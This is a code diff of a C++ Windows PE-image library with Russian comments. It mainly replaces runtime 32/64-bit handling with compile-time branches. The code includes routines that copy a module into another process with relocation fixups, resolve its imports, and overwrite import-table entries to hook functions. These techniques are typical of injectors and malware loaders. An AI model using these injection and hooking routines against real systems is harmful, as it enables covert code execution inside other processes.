@@ -1,12 +1,8 @@
-#include <windows.h>
+#include "common/rl_kernel.h"
 
-#include <common/peimage.h>
-#include <common/mem.h>
-#include <common/str.h>
-
-#if(PEIMAGE_32 != 1 && PEIMAGE_64 != 1)
-#error PEIMAGE 32 & 64 NOT DEFINED.
-#endif
+#include "common/peimage.h"
+#include "common/mem.h"
+#include "common/str.h"
 
 //Получение NT-заголовков.
 #define IMAGE_GET_NT_HEADERS(image) ((void *)((IMAGE_NT_HEADERS32 *)((LPBYTE)(image) + ((IMAGE_DOS_HEADER *)(image))->e_lfanew)))
@@ -22,7 +18,7 @@
 
 typedef PIMAGE_NT_HEADERS (WINAPI *CHECKSUMMAPPEDFILE)(PVOID baseAddress, DWORD fileLength, PDWORD headerSum, PDWORD checkSum);
 
-DWORD PeImage::createNtCheckSum(LPBYTE image, DWORD size)
+static DWORD createNtCheckSum(LPBYTE image, DWORD size)
 {
   DWORD ret = 0;
   HMODULE dll = CWA(kernel32, LoadLibraryA)("imagehlp.dll");
@@ -97,7 +93,7 @@ void *PeImage::_createFromMemory(PEDATA *pedata, void *mem, DWORD memSize, bool 
           case IMAGE_FILE_MACHINE_AMD64:
             sections       = (IMAGE_SECTION_HEADER *)((LPBYTE)(&((IMAGE_NT_HEADERS64 *)t)->OptionalHeader) + ((IMAGE_NT_HEADERS64 *)t)->FileHeader.SizeOfOptionalHeader);
             fileAligment   = ((IMAGE_NT_HEADERS64 *)t)->OptionalHeader.FileAlignment;
-            moduleAligment = ((IMAGE_NT_HEADERS64 *)t)->OptionalHeader.SectionAlignment;
+            moduleAligment = ((IMAGE_NT_HEADERS32 *)t)->OptionalHeader.SectionAlignment;
             break;
 #         endif
         }
@@ -181,7 +177,6 @@ void PeImage::_freeImage(PEDATA *pedata)
 {
   Mem::free(pedata->dosHeader);
   Mem::free(pedata->ntHeader.p32);
-  //Mem::free(pedata->ntHeader.p64);
   Mem::free(pedata->sections);
   Mem::freeArrayOfPointers(pedata->sectionsRawData, pedata->sectionsCount);
   Mem::free(pedata->sectionsFlags);
@@ -316,9 +311,7 @@ bool PeImage::_setNtHeader(PEDATA *pedata, PENTBASEDATA *basedata)
 #endif
 
     Mem::free(pedata->ntHeader.p32);
-	//Mem::free(pedata->ntHeader.p64);
     pedata->ntHeader.p32 = ntHeader; 
-	pedata->ntHeader.p64 = (IMAGE_NT_HEADERS64*)ntHeader; 
     return true; 
   }
   return false;
@@ -367,11 +360,7 @@ bool PeImage::_setNtHeaderFromNtHeader(PEDATA *pedata, void *ntHeader)
       
       Mem::_copy(p, ntHeader, size);
       Mem::free(pedata->ntHeader.p32);
-	  //Mem::free(pedata->ntHeader.p64);
-	  if(nt32Header->FileHeader.Machine == IMAGE_FILE_MACHINE_I386)
-		pedata->ntHeader.p32 = (IMAGE_NT_HEADERS32 *)p;
-	  else
-		pedata->ntHeader.p64 = (IMAGE_NT_HEADERS64 *)p;
+      pedata->ntHeader.p32 = (IMAGE_NT_HEADERS32 *)p; 
 
       //Заполняем dataDirectory.
       Mem::_zero(pedata->dataDirectory, sizeof(IMAGE_DATA_DIRECTORY) * IMAGE_NUMBEROF_DIRECTORY_ENTRIES);
@@ -456,7 +445,7 @@ bool PeImage::_setDataDirectory(PEDATA *pedata, BYTE index, DWORD virtualAddress
 DWORD PeImage::_buildImage(PEDATA *pedata, DWORD flags, DWORD rvaOfEntryPoint, LPBYTE *output)
 {
   if(output)*output = NULL;
-  if((pedata->dosHeader == NULL) || (pedata->ntHeader.p32 == NULL && pedata->ntHeader.p64 == NULL))return 0;
+  if(pedata->dosHeader == NULL || pedata->ntHeader.p32 == NULL)return 0;
    
   //Стартовые позиции.
   DWORD fileOffset = 0, virtualOffset = 0;
@@ -496,7 +485,7 @@ DWORD PeImage::_buildImage(PEDATA *pedata, DWORD flags, DWORD rvaOfEntryPoint, L
   virtualOffset += pedata->dosHeader->e_lfanew;
   
   //NT-заголовок.
-  LPBYTE newNtHeader = (output ? (LPBYTE)(image + fileOffset) : pedata->machine == IMAGE_FILE_MACHINE_I386 ? (LPBYTE)pedata->ntHeader.p32 : (LPBYTE)pedata->ntHeader.p64);
+  LPBYTE newNtHeader = (output ? (LPBYTE)(image + fileOffset) : (LPBYTE)pedata->ntHeader.p32);
   
   if(0){}
 #if(PEIMAGE_32 > 0)
@@ -661,7 +650,7 @@ DWORD PeImage::_buildImage(PEDATA *pedata, DWORD flags, DWORD rvaOfEntryPoint, L
 
 DWORD PeImage::_calcNextSectionRva(PEDATA *pedata, DWORD sectionsCount)
 {
-  if(pedata->dosHeader == NULL || (pedata->ntHeader.p32 == NULL && pedata->ntHeader.p64 == NULL) || sectionsCount > MAX_SECTIONS)return 0;  
+  if(pedata->dosHeader == NULL || pedata->ntHeader.p32 == NULL || sectionsCount > MAX_SECTIONS)return 0;  
   
 #if(PEIMAGE_32 > 0 && PEIMAGE_64 > 0)
   DWORD alignment = pedata->machine == IMAGE_FILE_MACHINE_I386 ? pedata->ntHeader.p32->OptionalHeader.SectionAlignment : pedata->ntHeader.p64->OptionalHeader.SectionAlignment;
@@ -692,7 +681,7 @@ DWORD PeImage::_calcNextSectionRva(PEDATA *pedata, DWORD sectionsCount)
 
 DWORD PeImage::_getCurrentRawSize(PEDATA *pedata)
 {
-  if(pedata->dosHeader == NULL || (pedata->ntHeader.p32 == NULL || pedata->ntHeader.p64 == NULL))return 0;
+  if(pedata->dosHeader == NULL || pedata->ntHeader.p32 == NULL)return 0;
 
   DWORD size = pedata->dosHeader->e_lfanew;
   
@@ -742,7 +731,7 @@ DWORD PeImage::_getRawSize(const void *image)
 
 DWORD PeImage::_getCurrentVirtualSize(PEDATA *pedata)
 {
-  if(pedata->dosHeader == NULL || (pedata->ntHeader.p32 == NULL && pedata->ntHeader.p64 == NULL))return 0;
+  if(pedata->dosHeader == NULL || pedata->ntHeader.p32 == NULL)return 0;
 
   DWORD size = pedata->dosHeader->e_lfanew;
 
@@ -764,20 +753,16 @@ DWORD PeImage::_getCurrentVirtualSize(PEDATA *pedata)
   return size;
 }
 
-DWORD PeImage::_getNumberOfSections(HMODULE module)
-{
-  LPBYTE p = (LPBYTE)module;
-  IMAGE_NT_HEADERS32 *ntHeader = (IMAGE_NT_HEADERS32 *)(p + ((PIMAGE_DOS_HEADER)p)->e_lfanew);
-
-  return ntHeader->FileHeader.NumberOfSections;
-}
-
 void *PeImage::_getSectionOfModule(HMODULE module, WORD index, LPDWORD virtualSize)
 {
   void *r = NULL;
   LPBYTE p = (LPBYTE)module;
 
+#if defined _WIN64
+  IMAGE_NT_HEADERS64 *ntHeader = (IMAGE_NT_HEADERS64 *)(p + ((PIMAGE_DOS_HEADER)p)->e_lfanew);
+#else
   IMAGE_NT_HEADERS32 *ntHeader = (IMAGE_NT_HEADERS32 *)(p + ((PIMAGE_DOS_HEADER)p)->e_lfanew);
+#endif
 
   IMAGE_SECTION_HEADER *sections = (IMAGE_SECTION_HEADER *)((LPBYTE)(&ntHeader->OptionalHeader) + ntHeader->FileHeader.SizeOfOptionalHeader);
   
@@ -836,31 +821,13 @@ IMAGE_SECTION_HEADER *PeImage::_getSectionByName(const void *image, LPSTR const 
 
 void *PeImage::_copyModuleToProcess(HANDLE process, void *image)
 {
-	DWORD imageSize;
-	bool isX64 = false;
-	PIMAGE_NT_HEADERS32 ntHeader32 = (PIMAGE_NT_HEADERS32)((LPBYTE)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
-	PIMAGE_NT_HEADERS64 ntHeader64 = (PIMAGE_NT_HEADERS64)ntHeader32;
-#if(PEIMAGE_32 > 0 && PEIMAGE_64 > 0)
-  if(ntHeader32->FileHeader.Machine == IMAGE_FILE_MACHINE_I386)
-  {
-	  imageSize = ntHeader32->OptionalHeader.SizeOfImage;
-  }
-  else if(ntHeader32->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64)
-  {
-	  imageSize = ntHeader64->OptionalHeader.SizeOfImage;
-	  isX64 = true;
-  }
-  else
-	  return NULL;
-#elif (PEIMAGE_64 > 0)
-  imageSize = ntHeader32->OptionalHeader.SizeOfImage;
-  if(ntHeader32->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) return NULL;
-  isX64 = true;
-#elif (PEIMAGE_32 > 0)
-  imageSize = ntHeader->OptionalHeader.SizeOfImage;
-  if(ntHeader32->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) return NULL;
+#if defined _WIN64
+  PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS)((LPBYTE)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
+#else
+  PIMAGE_NT_HEADERS32 ntHeader = (PIMAGE_NT_HEADERS)((LPBYTE)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
 #endif
   
+  DWORD imageSize = ntHeader->OptionalHeader.SizeOfImage;
   bool ok         = false;
 
   if(CWA(kernel32, IsBadReadPtr)(image, imageSize) != 0)return NULL;
@@ -874,12 +841,12 @@ void *PeImage::_copyModuleToProcess(HANDLE process, void *image)
     if(buf != NULL)
     {
       //Изменяем релоки.
-      IMAGE_DATA_DIRECTORY *relocsDir = isX64 ? &ntHeader64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC] : &ntHeader32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+      IMAGE_DATA_DIRECTORY *relocsDir = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
       
       if(relocsDir->Size > 0 && relocsDir->VirtualAddress > 0)
       {
-        DWORD_PTR delta               = (DWORD_PTR)((LPBYTE)remoteMem - (isX64 ? ntHeader64->OptionalHeader.ImageBase : ntHeader32->OptionalHeader.ImageBase));
-        DWORD_PTR oldDelta            = (DWORD_PTR)((LPBYTE)image - (isX64 ? ntHeader64->OptionalHeader.ImageBase : ntHeader32->OptionalHeader.ImageBase));
+        DWORD_PTR delta               = (DWORD_PTR)((LPBYTE)remoteMem - ntHeader->OptionalHeader.ImageBase);
+        DWORD_PTR oldDelta            = (DWORD_PTR)((LPBYTE)image - ntHeader->OptionalHeader.ImageBase);
         IMAGE_BASE_RELOCATION *relHdr = (IMAGE_BASE_RELOCATION *)(buf + relocsDir->VirtualAddress);
       
         while(relHdr->VirtualAddress != 0)
@@ -921,116 +888,84 @@ typedef HMODULE (WINAPI *liLoadLibraryA)(LPSTR);
 typedef void *(WINAPI *liGetProcAddress)(HMODULE, LPSTR);
 bool PeImage::_loadImport(void *image, void *loadLibraryA, void *getProcAddress)
 {
-	PIMAGE_NT_HEADERS64 ntHeader64 = (PIMAGE_NT_HEADERS64)((LPBYTE)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
-	PIMAGE_NT_HEADERS32 ntHeader32 = (PIMAGE_NT_HEADERS32)ntHeader64;
-	bool isX64 = ntHeader32->FileHeader.Machine != IMAGE_FILE_MACHINE_I386;
-
-	IMAGE_DATA_DIRECTORY *importDir = isX64 ? &ntHeader64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT] : &ntHeader32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
-	if(loadLibraryA && getProcAddress && importDir->VirtualAddress > 0 && importDir->Size > sizeof(IMAGE_IMPORT_DESCRIPTOR))
-	{
-	  
-		for(IMAGE_IMPORT_DESCRIPTOR *iid = (IMAGE_IMPORT_DESCRIPTOR *)((LPBYTE)image + importDir->VirtualAddress); iid->Characteristics != 0; iid++)
-		{
-			//Загружаем DLL.
-			HMODULE dll = (((liLoadLibraryA)loadLibraryA)((LPSTR)((LPBYTE)image + iid->Name)));
-			if(dll == NULL)return false;
-
-			IMAGE_THUNK_DATA64 *originalThunk64 = (IMAGE_THUNK_DATA64 *)((LPBYTE)image + iid->OriginalFirstThunk);
-			IMAGE_THUNK_DATA64 *thunk64         = (IMAGE_THUNK_DATA64 *)((LPBYTE)image + iid->FirstThunk);
-
-			IMAGE_THUNK_DATA32 *originalThunk32 = (IMAGE_THUNK_DATA32 *)((LPBYTE)image + iid->OriginalFirstThunk);
-			IMAGE_THUNK_DATA32 *thunk32         = (IMAGE_THUNK_DATA32 *)((LPBYTE)image + iid->FirstThunk);
-
-			if(isX64)
-			{
-				for(; originalThunk64->u1.Function != 0; originalThunk64++, thunk64++)
-				{
-					//Получаем имя функции.
-					LPSTR name;
-
-					if(originalThunk64->u1.Ordinal & IMAGE_ORDINAL_FLAG64)
-						name = (LPSTR)IMAGE_ORDINAL64(originalThunk64->u1.Ordinal);
-					else
-					{
-						IMAGE_IMPORT_BY_NAME *iin = (IMAGE_IMPORT_BY_NAME *)((LPBYTE)image + originalThunk64->u1.AddressOfData);
-						name = (LPSTR)(iin->Name);
-					}
-
-					//Получаем адрес.
-					DWORD_PTR addr = (DWORD_PTR)(((liGetProcAddress)getProcAddress)(dll, name));
-					if(addr == NULL)return false;
-		
-					thunk64->u1.Function = addr;
-				}
-			}
-			else
-			{
-				for(; originalThunk32->u1.Function != 0; originalThunk32++, thunk32++)
-				{
-					//Получаем имя функции.
-					LPSTR name;
-
-					if(originalThunk32->u1.Ordinal & IMAGE_ORDINAL_FLAG32)
-						name = (LPSTR)IMAGE_ORDINAL32(originalThunk32->u1.Ordinal);
-					else
-					{
-						IMAGE_IMPORT_BY_NAME *iin = (IMAGE_IMPORT_BY_NAME *)((LPBYTE)image + originalThunk32->u1.AddressOfData);
-						name = (LPSTR)(iin->Name);
-					}
-
-					//Получаем адрес.
-					DWORD_PTR addr = (DWORD_PTR)(((liGetProcAddress)getProcAddress)(dll, name));
-					if(addr == NULL)return false;
-		
-					thunk32->u1.Function = addr;
-				}
-			}
-		}
-	}
+#if defined _WIN64
+  PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)((LPBYTE)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
+#else
+  PIMAGE_NT_HEADERS32 ntHeader = (PIMAGE_NT_HEADERS32)((LPBYTE)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
+#endif
   
-	return true;
+  IMAGE_DATA_DIRECTORY *importDir = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+  if(loadLibraryA && getProcAddress && importDir->VirtualAddress > 0 && importDir->Size > sizeof(IMAGE_IMPORT_DESCRIPTOR))
+  {
+    for(IMAGE_IMPORT_DESCRIPTOR *iid = (IMAGE_IMPORT_DESCRIPTOR *)((LPBYTE)image + importDir->VirtualAddress); iid->Characteristics != 0; iid++)
+    {
+      //Загружаем DLL.
+      HMODULE dll = (((liLoadLibraryA)loadLibraryA)((LPSTR)((LPBYTE)image + iid->Name)));
+      if(dll == NULL)return false;
+    
+#     if defined _WIN64
+      IMAGE_THUNK_DATA64 *originalThunk = (IMAGE_THUNK_DATA64 *)((LPBYTE)image + iid->OriginalFirstThunk);
+      IMAGE_THUNK_DATA64 *thunk         = (IMAGE_THUNK_DATA64 *)((LPBYTE)image + iid->FirstThunk);
+#     else
+      IMAGE_THUNK_DATA32 *originalThunk = (IMAGE_THUNK_DATA32 *)((LPBYTE)image + iid->OriginalFirstThunk);
+      IMAGE_THUNK_DATA32 *thunk         = (IMAGE_THUNK_DATA32 *)((LPBYTE)image + iid->FirstThunk);
+#     endif
+
+      for(; originalThunk->u1.Function != 0; originalThunk++, thunk++)
+      {
+        //Получаем имя функции.
+        LPSTR name;
+        
+        #if defined _WIN64
+        if(originalThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64)name = (LPSTR)IMAGE_ORDINAL64(originalThunk->u1.Ordinal);
+        #else
+        if(originalThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32)name = (LPSTR)IMAGE_ORDINAL32(originalThunk->u1.Ordinal);
+        #endif
+        else
+        {
+          IMAGE_IMPORT_BY_NAME *iin = (IMAGE_IMPORT_BY_NAME *)((LPBYTE)image + originalThunk->u1.AddressOfData);
+          name = (LPSTR)(iin->Name);
+        }
+
+        //Получаем адрес.
+        DWORD_PTR addr = (DWORD_PTR)(((liGetProcAddress)getProcAddress)(dll, name));
+        if(addr == NULL)return false;
+        thunk->u1.Function = addr;
+      }
+    }
+  }
+  
+  return true;
 }
 
 bool PeImage::_repalceImportFunction(void *image, const void *oldFunction, const void *newFunction)
 {
   bool ret = false;
-  PIMAGE_NT_HEADERS64 ntHeader64 = (PIMAGE_NT_HEADERS64)((LPBYTE)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
-  PIMAGE_NT_HEADERS32 ntHeader32 = (PIMAGE_NT_HEADERS32)ntHeader64;
-  bool isX64 = ntHeader32->FileHeader.Machine != IMAGE_FILE_MACHINE_I386;
+#if defined _WIN64
+  PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)((LPBYTE)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
+#else
+  PIMAGE_NT_HEADERS32 ntHeader = (PIMAGE_NT_HEADERS32)((LPBYTE)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
+#endif
 
-  IMAGE_DATA_DIRECTORY *importDir = isX64 ? &ntHeader64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT] : &ntHeader32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+  IMAGE_DATA_DIRECTORY *importDir = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
 
   if(importDir->VirtualAddress > 0 && importDir->Size > sizeof(IMAGE_IMPORT_DESCRIPTOR))
   {
     for(IMAGE_IMPORT_DESCRIPTOR *iid = (IMAGE_IMPORT_DESCRIPTOR *)((LPBYTE)image + importDir->VirtualAddress); iid->Characteristics != 0; iid++)
     {
-      IMAGE_THUNK_DATA64 *originalThunk64 = (IMAGE_THUNK_DATA64 *)((LPBYTE)image + iid->OriginalFirstThunk);
-      IMAGE_THUNK_DATA64 *thunk64         = (IMAGE_THUNK_DATA64 *)((LPBYTE)image + iid->FirstThunk);
-      IMAGE_THUNK_DATA32 *originalThunk32 = (IMAGE_THUNK_DATA32 *)((LPBYTE)image + iid->OriginalFirstThunk);
-      IMAGE_THUNK_DATA32 *thunk32         = (IMAGE_THUNK_DATA32 *)((LPBYTE)image + iid->FirstThunk);
+#     if defined _WIN64
+      IMAGE_THUNK_DATA64 *originalThunk = (IMAGE_THUNK_DATA64 *)((LPBYTE)image + iid->OriginalFirstThunk);
+      IMAGE_THUNK_DATA64 *thunk         = (IMAGE_THUNK_DATA64 *)((LPBYTE)image + iid->FirstThunk);
+#     else
+      IMAGE_THUNK_DATA32 *originalThunk = (IMAGE_THUNK_DATA32 *)((LPBYTE)image + iid->OriginalFirstThunk);
+      IMAGE_THUNK_DATA32 *thunk         = (IMAGE_THUNK_DATA32 *)((LPBYTE)image + iid->FirstThunk);
+#     endif
 
-	  if(isX64)
-	  {
-		  for(; originalThunk64->u1.Function != 0; originalThunk64++, thunk64++)if((DWORD_PTR)oldFunction == thunk64->u1.Function)
-		  {
-			DWORD flOldProtect;
-			VirtualProtect((LPVOID)&thunk64->u1.Function, sizeof(DWORD_PTR), PAGE_READWRITE, &flOldProtect);
-			thunk64->u1.Function = (DWORD_PTR)newFunction;	
-			VirtualProtect((LPVOID)&thunk64->u1.Function, sizeof(DWORD_PTR), flOldProtect, &flOldProtect);
-			ret = true;
-		  }
-	  }
-	  else
-	  {
-		  for(; originalThunk32->u1.Function != 0; originalThunk32++, thunk32++)if((DWORD_PTR)oldFunction == thunk32->u1.Function)
-		  {
-			DWORD flOldProtect;
-			VirtualProtect((LPVOID)&thunk32->u1.Function, sizeof(DWORD_PTR), PAGE_READWRITE, &flOldProtect);
-			thunk32->u1.Function = (DWORD_PTR)newFunction;	
-			VirtualProtect((LPVOID)&thunk32->u1.Function, sizeof(DWORD_PTR), flOldProtect, &flOldProtect);
-			ret = true;
-		  }
-	  }
+      for(; originalThunk->u1.Function != 0; originalThunk++, thunk++)if((DWORD_PTR)oldFunction == thunk->u1.Function)
+      {
+        thunk->u1.Function = (DWORD_PTR)newFunction;
+        ret = true;
+      }
     }
   }
 
@@ -1041,9 +976,7 @@ DWORD PeImage::_rvaToRsa(PEDATA *pedata, DWORD rva, LPWORD sectionIndex)
 {
   //Ищим секцию которой принадлежит адрес.
   DWORD ret = 0;
-  IMAGE_NT_HEADERS32 a;
-  WORD NumberOfSections = ((IMAGE_NT_HEADERS32*)IMAGE_GET_NT_HEADERS(pedata->dosHeader))->FileHeader.NumberOfSections;
-  for(WORD i = 0; i < NumberOfSections; i++)
+  for(WORD i = 0; i < pedata->ntHeader.p32->FileHeader.NumberOfSections; i++)
   {
     DWORD a = pedata->sections[i].VirtualAddress;
     if(rva >= a && rva < a + pedata->sections[i].Misc.VirtualSize)
@@ -1121,45 +1054,4 @@ bool PeImage::_isPeImage(void *mem, DWORD memSize)
      fileAligment % 2 != 0 || virtualAligment % 2 != 0)return false;
 
   return true;
-}
-
-void PeImage::normalizeRelocs(void* image, void* OldDelta, void* Delta)
-{
-	PIMAGE_NT_HEADERS64 ntHeader64 = (PIMAGE_NT_HEADERS64)((LPBYTE)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
-	PIMAGE_NT_HEADERS32 ntHeader32 = (PIMAGE_NT_HEADERS32)ntHeader64;
-	bool isX64 = ntHeader32->FileHeader.Machine != IMAGE_FILE_MACHINE_I386;
-
-	if(image != NULL)
-	{
-		//Изменяем релоки.
-		IMAGE_DATA_DIRECTORY *relocsDir = isX64 ? &ntHeader64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC] : &ntHeader32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-
-		if(relocsDir->Size > 0 && relocsDir->VirtualAddress > 0)
-		{
-			DWORD_PTR delta               = (DWORD_PTR)((LPBYTE)Delta - (isX64 ? ntHeader64->OptionalHeader.ImageBase : ntHeader32->OptionalHeader.ImageBase));
-			DWORD_PTR oldDelta            = (DWORD_PTR)((LPBYTE)OldDelta - (isX64 ? ntHeader64->OptionalHeader.ImageBase : ntHeader32->OptionalHeader.ImageBase));
-			IMAGE_BASE_RELOCATION *relHdr = (IMAGE_BASE_RELOCATION *)((LPBYTE)image + relocsDir->VirtualAddress);
-
-			while(relHdr->VirtualAddress != 0)
-			{
-				if(relHdr->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))
-				{
-					DWORD relCount = (relHdr->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
-					LPWORD relList = (LPWORD)((LPBYTE)relHdr + sizeof(IMAGE_BASE_RELOCATION));
-
-					for(DWORD i = 0; i < relCount; i++)if(relList[i] > 0)
-					{
-						DWORD_PTR *p = (DWORD_PTR *)((LPBYTE)image + (relHdr->VirtualAddress + (0x0FFF & (relList[i]))));
-						*p -= oldDelta;
-						*p += delta;
-					}
-				}
-
-				relHdr = (IMAGE_BASE_RELOCATION *)((LPBYTE)relHdr + relHdr->SizeOfBlock);
-			}
-
-				
-		}
-
-	}
 }
